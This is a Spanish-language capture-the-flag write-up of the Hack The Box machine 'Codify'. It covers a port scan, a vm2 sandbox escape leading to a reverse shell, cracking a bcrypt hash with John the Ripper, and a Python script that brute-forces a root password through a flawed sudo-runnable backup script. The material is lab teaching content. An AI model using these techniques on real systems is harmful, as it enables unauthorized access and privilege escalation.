---
layout: single
title: Codify - Hack The Box
excerpt: "Para vulnerar esta máquina ByPasseamos la medidad de seguridad de la biblioteca vim2 donde podemos ejecutar código malicioso NodeJS, pudiendo así llevar a cabo una ejecución Remota de Comandos, aprovechándonos de esto nos entablamos una Reverse Shell para posterior a ello escalar Privilegios con unas credenciales de una base de datos que estarían hasheadas, usamos una herramienta para ver en texto plano las credenciales, por último llevaríamos a cabo una Escalada de Privilegios para convertirnos en ROOT aprovechandonos de un .sh del cual tenemos SUDOERS"
date: 2023-11-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-codify/codify_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - vm2 Sandbox Bypass
  - RCE
  - db creds
  - password cracking
  - abusing sudoers
  - brute force login

---

![](/assets/images/htb-writeup-codify/codify_logo.png)

# PortScan

```
nmap -p- --open -vvv --min-rate 5000 -Pn -n 10.10.11.239
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 12:23 AST
Initiating SYN Stealth Scan at 12:23
Scanning 10.10.11.239 [65535 ports]
Discovered open port 80/tcp on 10.10.11.239
Discovered open port 22/tcp on 10.10.11.239
Discovered open port 3000/tcp on 10.10.11.239
Completed SYN Stealth Scan at 12:23, 13.36s elapsed (65535 total ports)
Nmap scan report for 10.10.11.239
Host is up, received user-set (0.054s latency).
Scanned at 2023-11-08 12:23:17 AST for 13s
Not shown: 65520 closed tcp ports (reset), 12 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
           Raw packets sent: 67086 (2.952MB) | Rcvd: 65581 (2.623MB)
```


# Sitio Web

![](/assets/images/htb-writeup-codify/Pasted image 20231108122352.png)

Sí leemos, vemos qué es un sitio web para probar código en Node.js, lo primero qué se me ocurre es probar código malicioso JavaScript, pero seguimos indagando un poco en la página, hasta que en la parte izquierda vemos una opción de "**About US**", clickeó allí para ver sí dan algún tipo de información.

![](/assets/images/htb-writeup-codify/Pasted image 20231108122528.png)

Como vemos nos dice qué está usando una librería **"vm2"**, para evitar el JavaScript & qué también tiene una capa de seguridad para evitar código malicioso, lo primero que se me ocurre es buscar en internet posibles **ByPass** para el vm2, así encontrando este recurso:

https://security.snyk.io/vuln/SNYK-JS-VM2-5537100

El recurso nos proporciona un **PoC** para llevar a cabo una **RCE**, lo probamos en el editor de texto del sitio web.

![](/assets/images/htb-writeup-codify/Pasted image 20231108122947.png)

Como vemos estamos llevando a cabo una ejecución Remota de Comandos, por lo qué podemos entablarnos una Reverse Shell de manera fácil.
![](/assets/images/htb-writeup-codify/Pasted image 20231108123302.png)

Nos ponemos en escucha...

![](/assets/images/htb-writeup-codify/Pasted image 20231108123251.png)


Obtendríamos la Reverse Shell y estaríamos dentro de la máquina, tan sólo quedaría darle tratamiento a la TTY, sino sabes, te recomiendo ver este post.[((Click aquí))]()

# Escalada de Privilegios #1 

Sí vemos el **"/etc/passwd"** veríamos que hay un usuario con nombre "**joshua**", así que nos interesaría convertirnos en él, buscando recursos qué podamos leer y aprovecharnos, encontramos en la ruta "**/var/www/conctact**" que dentro contiene una .db.

![](/assets/images/htb-writeup-codify/Pasted image 20231108123645.png)


Como vemos tenemos un hash con lo que parece ser la contraseña, así que usamos la herramienta "**John The Rippe**r" para tratar de hacerle un descrypt.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt --show
```

dentro del "hash.txt" pondríamos el hash qué vimos de la .db para brute forcearlo, dándonos al cabo de unos minutos la credencial correspondiente del usuario **Joshua**, por lo qué podríamos convertirnos en él.

![](/assets/images/htb-writeup-codify/Pasted image 20231108123956.png)

# Escalada de Privilegios #2

Sí buscamos por permisos SUDOERS.

![](/assets/images/htb-writeup-codify/Pasted image 20231108124112.png)

Vemos que podemos ejecutar como **Root** el script en Bash "**mysql-backup.sh**", lo ejecutamos para ver como funciona.
![](/assets/images/htb-writeup-codify/Pasted image 20231108124236.png)

Debemos proporcionar la contraseña de **Root**, cuyas credenciales no sabemos, pero como podemos ejecutar el script las veces qué queramos podemos hacer un ataque de fuerza bruta, para ello nos aprovechamos del siguiente script en Python.

```python
import string  
import subprocess  
all = list(string.ascii_letters + string.digits)  
password = ""  
found = False  
  
while not found:  
for character in all:  
command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
if "Password confirmed!" in output:  
password += character  
print(password)  
break  
else:  
found = True
```

Que al ejecutarlo nos reportará la contraseña, y ya podemos convertirnos en ROOT.

![](/assets/images/htb-writeup-codify/Pasted image 20231108124612.png)
